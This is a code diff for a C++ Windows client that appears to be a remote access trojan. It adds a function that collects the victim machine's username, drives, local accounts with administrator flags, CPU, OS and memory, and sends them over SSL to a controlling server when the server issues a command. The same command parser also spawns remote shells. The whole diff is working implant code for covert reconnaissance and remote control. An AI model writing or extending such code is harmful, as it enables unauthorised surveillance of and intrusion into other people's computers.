@@ -1,6 +1,112 @@
 #include "Client.hpp"
 #include "Commands.hpp"
 #include "Misc.hpp"
+#include "Info.hpp"
+
+bool Client::SendInfo(){
+	bool bFlag = true;
+	std::string strInfo = "";
+	std::vector<struct sDrives> DriveList;
+	std::vector<struct sUsers> UserList;
+	char *ModelName = nullptr, *cArch = nullptr, *cOS = nullptr, *cUser = nullptr;
+	Users(UserList);
+	Drives(DriveList);
+	Cpu(ModelName, cArch);
+    OS(cOS);
+	UserName(cUser);
+	int iRam = Mem(), iI = 0;
+	if(cUser != nullptr){
+		strInfo.append(cUser);
+	} else {
+		strInfo.append("siseneg");
+	}
+	strInfo.append(1, '|');
+
+	for(iI = 0; iI < int(DriveList.size()); iI++){
+		strInfo.append(DriveList[iI].cLetter);
+		strInfo.append(1, '/');
+		strInfo.append(DriveList[iI].cLabel);
+		strInfo.append(1, '/');
+		strInfo.append(DriveList[iI].cType);
+		strInfo.append(1, '/');
+		strInfo.append(std::to_string(DriveList[iI].dFree));
+		strInfo.append(1, '/');
+		strInfo.append(std::to_string(DriveList[iI].dTotal));
+		strInfo.append(1, '*');
+	}
+	
+	strInfo.append(1, '|');
+	
+	for(iI = 0; iI < int(UserList.size()); iI++){
+		strInfo.append(UserList[iI].cUsername);
+		if(UserList[iI].isAdmin == true){
+			strInfo.append("/1");
+		} else {
+			strInfo.append("/0");
+		}
+		strInfo.append(1, '*');
+	}
+	
+	strInfo.append(1, '|');
+
+	if(ModelName != nullptr){
+		strInfo.append(ModelName);
+	} else {
+		strInfo.append("Err");
+	}
+	strInfo.append(1, '^');
+	if(cArch != nullptr){
+		strInfo.append(cArch);
+	} else {
+		strInfo.append("Err");
+	}
+	strInfo.append(1, '|');
+	if(cOS != nullptr){
+		strInfo.append(cOS);
+	} else {
+		strInfo.append("Win");
+	}
+	strInfo.append(1, '|');
+	strInfo.append(std::to_string(iRam));
+	strInfo.append("|AAA");
+	
+	#ifdef _DEBUG
+	std::cout<<"packet\n"<<strInfo<<'\n';
+	#endif
+	int iLen = strInfo.length(), iBytes = 0;
+	TryAgain:
+	iBytes = SSL_write(sslSocket, strInfo.c_str(), iLen);
+	if(iBytes <= 0){
+        if(!CheckSslReturnCode(iBytes)){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send data to server\n";
+			error();
+			#endif
+            bFlag = false;
+		} else {
+			Sleep(200);
+			goto TryAgain;
+		}
+	}
+
+	if(cUser){
+		delete[] cUser;
+		cUser = nullptr;
+	}
+	if(cOS){
+		delete[] cOS;
+		cOS = nullptr;
+	}
+	if(ModelName){
+		delete[] ModelName;
+		ModelName = nullptr;
+	}
+	if(cArch){
+		delete[] cArch;
+		cArch = nullptr;
+	}
+	return bFlag;
+}
 
 bool Client::CheckSslReturnCode(int iRet){
 	int iTmp = SSL_get_error(sslSocket, iRet);
@@ -280,6 +386,18 @@ bool Client::ParseCommand(char*& strCommand){
 		}
 		if(vcCommands[0] == CommandCodes::cShell){
 			SpawnShell(vcCommands[1].c_str());
+			goto release;
+		}
+		
+		if(vcCommands[0] == "i"){
+			if(vcCommands[1] == "0"){
+				if(!SendInfo()){
+					#ifdef _DEBUG
+					std::cout<<"Unable to send information\n";
+					error();
+					#endif
+				}
+			}
 			goto release;
 		}
 	} else {
